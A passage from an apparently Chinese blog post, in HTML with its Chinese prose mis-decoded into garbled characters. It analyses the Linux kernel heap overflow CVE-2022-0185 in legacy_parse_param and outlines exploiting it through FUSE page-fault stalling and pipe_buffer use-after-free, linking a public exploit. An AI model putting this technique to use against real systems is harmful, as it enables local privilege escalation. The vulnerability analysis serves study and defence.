class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> *<span class="title">ctx</span> =</span> fc-&gt;fs_private;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size = ctx-&gt;data_size;</span><br><span class="line">	<span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Non-string source&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line">			<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Multiple sources&quot;</span>);</span><br><span class="line">		fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">		param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (param-&gt;type) &#123;</span><br><span class="line">	<span class="keyword">case</span> fs_value_is_string:</span><br><span class="line">		len = <span class="number">1</span> + param-&gt;size;</span><br><span class="line">		<span class="comment">/* Fall through */</span></span><br><span class="line">	<span class="keyword">case</span> fs_value_is_flag:</span><br><span class="line">		len += <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,</span><br><span class="line">			      param-&gt;key);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">	    (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">	     <span class="built_in">memchr</span>(param-&gt;<span class="built_in">string</span>, <span class="string">&#x27;,&#x27;</span>, param-&gt;size)))</span><br><span class="line">		<span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,</span><br><span class="line">			      param-&gt;key);</span><br><span class="line">	<span class="keyword">if</span> (!ctx-&gt;legacy_data) &#123;</span><br><span class="line">		ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!ctx-&gt;legacy_data)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ctx-&gt;legacy_data[size++] = <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">	len = <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line">	<span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);</span><br><span class="line">	size += len;</span><br><span class="line">	<span class="keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;</span><br><span class="line">		ctx-&gt;legacy_data[size++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">		<span class="built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="built_in">string</span>, param-&gt;size);</span><br><span class="line">		size += param-&gt;size;</span><br><span class="line">	&#125;</span><br><span class="line">	ctx-&gt;legacy_data[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	ctx-&gt;data_size = size;</span><br><span class="line">	ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåœ¨<code>ctx-&gt;data_size</code>ä¸­å–å‡ºå·²æ‹·è´çš„å¤§å°ï¼Œéšåæ ¹æ®<code>param-&gt;type</code>è®¡ç®—å‡ºlenï¼Œè‹¥æ˜¯ä¸å­˜åœ¨<code>ctx-&gt;legacy_data</code>åˆ™ä¼šç”³è¯·ä¸€å¼ é¡µé¢å¤§å°ï¼Œåç»­åˆ™æ˜¯ä»<code>param</code>ä¸­å–å‡ºæ•°æ®å†™åˆ°<code>ctx-legacy_data</code>ä¸­å»ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°åœ¨è®¡ç®—å‡ºlenä¹‹åå…¶å®æ˜¯ç»è¿‡äº†ä¸€æ¬¡åˆ¤æ–­çš„ï¼Œ<code>len &gt; PAGE_SIZE - 2 - size</code>è¿™é‡Œå°±æ˜¯å…¶è¡¨è¾¾å¼ï¼Œä¸è¿‡å­˜åœ¨é—®é¢˜çš„æ˜¯åœ¨å‡½æ•°å¼€å¤´å®šä¹‰<code>size</code>ä½¿ç”¨çš„æ˜¯<code>unsigned int</code>ï¼Œæ‰€ä»¥è¿™ä¸ªåˆ¤æ–­å°±æˆäº†æ— ç¬¦å·ç±»å‹çš„åˆ¤æ–­äº†ï¼Œä¸€æ—¦<code>size + 2</code>å¤§äº<code>PAGE_SIZE</code>é‚£ä¹ˆè¿™ä¸ªåˆ¤æ–­æ˜¯ä¼šä¸€ç›´æˆç«‹çš„ï¼Œä»è€Œè¾¾åˆ°äº†æº¢å‡ºçš„æ•ˆæœã€‚</p>
<p>ä¸è¿‡è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨å‰é¢çš„<code>fsconfig</code>ç³»ç»Ÿè°ƒç”¨å®ç°çš„å‡½æ•°ä¸­åœ¨å¯¹<code>param</code>è¿›è¡Œåˆå§‹åŒ–æ—¶ä½¿ç”¨çš„æ˜¯è¿™æ ·ä¸€æ¡è¯­å¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¹Ÿå°±é™åˆ¶äº†æˆ‘ä»¬å•æ¬¡å†™å…¥çš„å¤§å°åªèƒ½æ˜¯<code>0x100</code>ä¸ªå­—èŠ‚ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°çš„æ˜¯åœ¨<code>legacy_parse_param</code>å‡½æ•°æœ«å°¾æ˜¯åˆå¯¹<code>ctx-&gt;data_size</code>è¿›è¡Œäº†èµ‹å€¼å¹¶ä¸”å€¼çš„å¤§å°ä¸º<code>len + size</code>å’Œ<code>size += param-&gt;size;</code>ï¼Œå¹¶ä¸”åé¢åœ¨æ‹·è´çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯<code>ctx-&gt;legacy_data + size</code>ã€‚æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¾¾åˆ°æº¢å‡ºçš„æ•ˆæœéœ€è¦å°†<code>size</code>æ„é€ ä¸º4095ã€‚</p>
<p>å‰é¢æåˆ°äº†<code>size</code>æœ€ç»ˆçš„å€¼æ˜¯é‚£ä¸¤ä¸ªçš„å’Œï¼Œä½†å…¶å®è¿˜å­˜åœ¨ä¸¤ä¸ªæ“ä½œä¼šå¯¹å…¶åšå¢åŠ æ“ä½œï¼Œä¹Ÿå°±æ˜¯åœ¨æ¯ä¸€æ¡å‰é¢éƒ½ä¼šåŠ ä¸Šä¸€ä¸ª<code>&quot;,&quot;</code>è€Œåœ¨keyåé¢éƒ½ä¼šåŠ ä¸Šä¸€ä¸ª<code>&quot;=&quot;</code>æ‰€ä»¥å…¶å®å†™å…¥çš„æœ€ç»ˆæ•ˆæœå¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,key=val</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ¯ä¸€æ¬¡æ‹·è´çš„é•¿åº¦å…¶å®æ˜¯<code>strlen(key) + strlen(val) + 2</code></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å¯ä»¥é¢„è§çš„æ˜¯ï¼Œå½“æˆ‘ä»¬æ§åˆ¶<code>size = 4095</code>æ—¶ï¼Œä»–ä¼šåœ¨ä¸‹ä¸€ä¸ªç›¸é‚»<code>object</code>å†™å…¥<code>=</code>ä»¥åŠæœ«å°¾çš„ä¸€ä¸ª<code>\x00</code>ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡å–çš„åŠæ³•æ˜¯ä¸ç›´æ¥è¦†ç›–ç›¸é‚»<code>object</code>çš„å†…å®¹ï¼Œè€Œæ˜¯ç›´æ¥è¦†ç›–æ‰åä¸€ä¸ª<code>object</code>çš„å†…å®¹ã€‚</p>
<h3 id="FUSE"><a href="#FUSE" class="headerlink" title="FUSE"></a>FUSE</h3><p>åœ¨ä»¥å¾€çš„æ–‡ç« ä¸­æåˆ°äº†<code>userfaultfd</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå¯æƒœçš„æ˜¯åœ¨<code>Linux 5.11</code>èµ·å°±ä¸å†èƒ½ç”¨æ™®é€šç”¨æˆ·è¿›è¡Œè°ƒç”¨äº†ï¼Œç„¶è€Œå…¶å®<code>FUSE</code>ä¹Ÿæ˜¯å¯ä»¥è¾¾åˆ°é‡æ ·çš„æ•ˆæœçš„ã€‚</p>
<p>é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹<code>FUSE</code>ï¼Œå³ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿï¼Œè¯¥åŠŸèƒ½å…è®¸éç‰¹æƒç”¨æˆ·åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿï¼Œå¼€å‘è€…åªéœ€è¦å®ç°å¯¹åº”çš„æ–‡ä»¶æ“ä½œæ¥å£å°±å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ï¼Œè¿™ç»™å¼€å‘è€…æä¾›äº†ç›¸å½“çš„ä¾¿åˆ©ã€‚</p>
<p><code>FUSE</code> è‡ª <code>Linux 2.6.14</code> ç‰ˆæœ¬å¼•å…¥ï¼Œä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li>FUSE å†…æ ¸æ¨¡å—ï¼Œè´Ÿè´£ä¸ kernel çš„ VFS è¿›è¡Œäº¤äº’ï¼Œå¹¶å‘ç”¨æˆ·ç©ºé—´å®ç°çš„æ–‡ä»¶ç³»ç»Ÿè¿›ç¨‹æš´éœ² <code>/dev/fuse</code> å—è®¾å¤‡æ¥å£</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/libfuse/libfuse" >ç”¨æˆ·ç©ºé—´çš„ libfuse åº“<i class="fas fa-external-link-alt"></i></a> è´Ÿè´£å‘ç”¨æˆ·ç¨‹åºæä¾›å°è£…å¥½çš„æ¥å£ï¼Œå¼€å‘è€…åŸºäºè¯¥åº“è¿›è¡Œç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿçš„å¼€å‘ï¼šç”±ä¸€ä¸ª <code>FUSE daemon</code> å®ˆæŠ¤è¿›ç¨‹è´Ÿè´£ä¸å†…æ ¸æ¨¡å—è¿›è¡Œäº¤äº’å¹¶è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“æ“ä½œ</li>
</ul>
<p><img   src="/images/zDwY7GMZQkE2c9m.png" ></p>
<p>FUSE çš„åŸºæœ¬è¿è¡ŒåŸç†å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>FUSE daemon</code> å®ˆæŠ¤è¿›ç¨‹é€šè¿‡ libfuse åº“çš„ <code>fuse_main()</code> æ³¨å†Œæ–‡ä»¶ç³»ç»Ÿä¸å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œå¹¶æŒ‚è½½åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼ˆä¾‹å¦‚ <code>/mnt/fuse</code>ï¼‰</li>
<li>ç”¨æˆ·è¿›ç¨‹è®¿é—®æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>/mnt/fuse/file</code>ï¼‰ï¼Œæ¥åˆ°å†…æ ¸ä¸­çš„ VFS å¯¹åº” inode çš„ <code>inode_operations</code> ä¸­çš„å¤„ç†å‡½æ•°ï¼Œäº¤ç”± FUSE å†…æ ¸æ¨¡å—è¿›è¡Œå¤„ç†</li>
<li>FUSE å†…æ ¸æ¨¡å—å°†è¯·æ±‚è½¬æ¢ä¸ºä¸ç”¨æˆ·æ€ daemon è¿›ç¨‹é—´çº¦å®šçš„æ ¼å¼ï¼Œäº¤ç”±ç”¨æˆ·æ€å¯¹åº”çš„ <code>FUSE daemon</code> å®ˆæŠ¤è¿›ç¨‹è¿›è¡Œå¤„ç†</li>
<li>åœ¨ <code>FUSE daemon</code> è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿåˆ›å»ºæ—¶æ³¨å†Œçš„å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œè¿™ä¸€æ­¥å¯èƒ½ä¼šéœ€è¦è®¿é—®å®é™…çš„æ–‡ä»¶ç³»ç»Ÿ</li>
<li><code>FUSE daemon</code> å®Œæˆå¤„ç†ï¼Œè¿”å›ç»“æœè‡³ FUSE å†…æ ¸æ¨¡å—ï¼Œå†ç»ç”± VFS è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹</li>
</ul>
<p><img   src="/images/9q3VSGepCnKzbuB.png" ></p>
<p>è¿™é‡Œä¸è¿‡å¤šä»‹ç»äº†ï¼Œåé¢å°±è¯´è¯´åŸºæœ¬ç”¨æ³•å°±è¡Œäº†ï¼Œä¹Ÿå’Œ<code>userfaultfd</code>ç±»ä¼¼ï¼Œæ˜¯ä¸€ä¸ªæ¨¡æ¿ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*getattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct stat *, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*readlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*mknod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, <span class="keyword">dev_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*mkdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>);</span><br><span class="line">	<span class="comment">/** Remove a file */</span></span><br><span class="line">	<span class="keyword">int</span> (*unlink) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="comment">/** Remove a directory */</span></span><br><span class="line">	<span class="keyword">int</span> (*rmdir) (<span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="comment">/** Create a symbolic link */</span></span><br><span class="line">	<span class="keyword">int</span> (*symlink) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="keyword">int</span> (*rename) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags);</span><br><span class="line">	<span class="keyword">int</span> (*link) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="keyword">int</span> (*chmod) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*chown) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">uid_t</span>, <span class="keyword">gid_t</span>, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*truncate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span>, struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*open) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*read) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">		     struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*write) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">		      struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*statfs) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct statvfs *);</span><br><span class="line">	<span class="keyword">int</span> (*flush) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*release) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*fsync) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*setxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*getxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*listxattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line">	<span class="keyword">int</span> (*removexattr) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	<span class="keyword">int</span> (*opendir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*readdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">fuse_fill_dir_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">			struct fuse_file_info *, <span class="keyword">enum</span> fuse_readdir_flags);</span><br><span class="line">	<span class="keyword">int</span> (*releasedir) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*fsyncdir) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">void</span> *(*init) (struct fuse_conn_info *conn,</span><br><span class="line">		       struct fuse_config *cfg);</span><br><span class="line">	<span class="keyword">void</span> (*destroy) (<span class="keyword">void</span> *private_data);</span><br><span class="line">	<span class="keyword">int</span> (*access) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line">	<span class="keyword">int</span> (*create) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mode_t</span>, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*lock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> cmd,</span><br><span class="line">		     struct flock *);</span><br><span class="line">	 <span class="keyword">int</span> (*utimens) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> struct timespec tv[<span class="number">2</span>],</span><br><span class="line">			 struct fuse_file_info *fi);</span><br><span class="line">	<span class="keyword">int</span> (*bmap) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span> blocksize, <span class="keyword">uint64_t</span> *idx);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> FUSE_USE_VERSION &lt; 35</span></span><br><span class="line">	<span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">		      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">int</span> (*ioctl) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">void</span> *arg,</span><br><span class="line">		      struct fuse_file_info *, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">void</span> *data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> (*poll) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *,</span><br><span class="line">		     struct fuse_pollhandle *ph, <span class="keyword">unsigned</span> *reventsp);</span><br><span class="line">	<span class="keyword">int</span> (*write_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec *buf, <span class="keyword">off_t</span> off,</span><br><span class="line">			  struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*read_buf) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_bufvec **bufp,</span><br><span class="line">			 <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> off, struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">int</span> (*flock) (<span class="keyword">const</span> <span class="keyword">char</span> *, struct fuse_file_info *, <span class="keyword">int</span> op);</span><br><span class="line">	<span class="keyword">int</span> (*fallocate) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">off_t</span>, <span class="keyword">off_t</span>,</span><br><span class="line">			  struct fuse_file_info *);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*copy_file_range) (<span class="keyword">const</span> <span class="keyword">char</span> *path_in,</span><br><span class="line">				    struct fuse_file_info *fi_in,</span><br><span class="line">				    <span class="keyword">off_t</span> offset_in, <span class="keyword">const</span> <span class="keyword">char</span> *path_out,</span><br><span class="line">				    struct fuse_file_info *fi_out,</span><br><span class="line">				    <span class="keyword">off_t</span> offset_out, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags);</span><br><span class="line">	<span class="keyword">off_t</span> (*lseek) (<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">off_t</span> off, <span class="keyword">int</span> whence, struct fuse_file_info *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä½¿ç”¨æ—¶éœ€è¦å…ˆå®ç°ä¸Šé¢å‡½æ•°è¡¨ä¸­çš„å‡½æ•°æ¥å£ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œå…¶å®éƒ½æ˜¯é€šè¿‡å¯¹è¯¥å‡½æ•°è¡¨ä¸­å®šä¹‰çš„å‡½æ•°å›è°ƒå®ç°çš„ã€‚</p>
<p>ä¸éš¾æƒ³åˆ°ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿï¼Œä¸ºè¯»å†™ç­‰æ¥å£æ³¨å†Œå›è°ƒå‡½æ•°ï¼Œä½¿ç”¨ mmap å°†è¯¥æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œå½“è¿›ç¨‹åœ¨å†…æ ¸ä¸­è¯»å†™è¿™å— mmap å†…å­˜æ—¶ï¼Œä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶æ§åˆ¶æƒä¾¿ä¼šè½¬äº¤åˆ°æˆ‘ä»¬æ³¨å†Œçš„å›è°ƒå‡½æ•°å½“ä¸­ï¼Œç„¶è€Œåœ¨å›è°ƒå‡½æ•°ä¸­çš„æ“ä½œæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥æ•ˆæœå°±å¾ˆç±»ä¼¼äº<code>userfaultfd</code>äº†ã€‚</p>
<p>ä¸è¿‡å¸¸è§„çš„ libfuse åº“å¹¶ä¸æ”¯æŒé™æ€ç¼–è¯‘ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ— æ³•åƒä»¥å¾€ä¸€æ ·å…ˆé™æ€ç¼–è¯‘ä¸€ä¸ª exp å†ä¼ åˆ°è¿œç¨‹ï¼Œä¸è¿‡åœ¨æ­¤CVEçš„githubä»“åº“ä¸­å­˜åœ¨å…¶é™æ€ç¼–è¯‘çš„æ“ä½œã€‚<a class="link"   target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p>è¿™é‡Œæœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œé¦–å…ˆå°±æ˜¯æˆ‘ä»¬åœ¨ <a class="link"   target="_blank" rel="noopener" href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >å‘pipe_bufferè¯´yesï¼<i class="fas fa-external-link-alt"></i></a> æ–‡ç« ä¸­æåˆ°çš„ä½¿ç”¨<code>pipe_buffer</code>æ„é€ å‡ºé¡µçº§çš„UAFï¼Œæœ€ç»ˆå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹åœ¨è¿™ä¸ªæ¼æ´ä¸­å¦‚ä½•ä½¿ç”¨å°±è¡Œï¼Œä¸è¿‡å¤šåœç•™äº† <del>ç»å¯¹ä¸æ˜¯å› ä¸ºæˆ‘æ˜¯æ‡’ç‹—ä¸æƒ³å†™exp</del> ï¼Œè¿™ç¯‡æ–‡ç« é‡ç‚¹è¿˜æ˜¯çœ‹<code>FUSE</code>çš„ç”¨æ³•ï¼Œæ‰€ä»¥å…·ä½“è¿˜æ˜¯åœ¨å¦ä¸€ç§åˆ©ç”¨æ‰‹æ³•ã€‚</p>
